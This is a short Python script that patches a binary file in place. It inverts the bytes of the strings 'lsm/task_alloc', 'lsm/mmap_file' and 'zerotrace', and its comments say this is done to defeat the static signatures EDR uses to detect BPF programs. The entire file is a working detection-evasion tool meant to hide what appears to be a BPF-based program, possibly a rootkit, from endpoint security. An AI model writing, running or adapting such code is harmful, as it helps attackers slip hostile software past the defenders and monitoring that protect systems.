import sys
import os

def mask_binary(path):
    if not os.path.exists(path):
        return
    with open(path, 'rb') as f:
        data = bytearray(f.read())
    
    # Strings that EDR looks for in BPF programs
    sensitive_patterns = [b"lsm/task_alloc", b"lsm/mmap_file", b"zerotrace"]
    
    for pattern in sensitive_patterns:
        # Simple bitwise NOT to break static signature matching
        masked = bytearray([(~b & 0xFF) for b in pattern])
        data = data.replace(pattern, masked)
        
    with open(path, 'wb') as f:
        f.write(data)

if __name__ == "__main__":
    mask_binary(sys.argv[1])
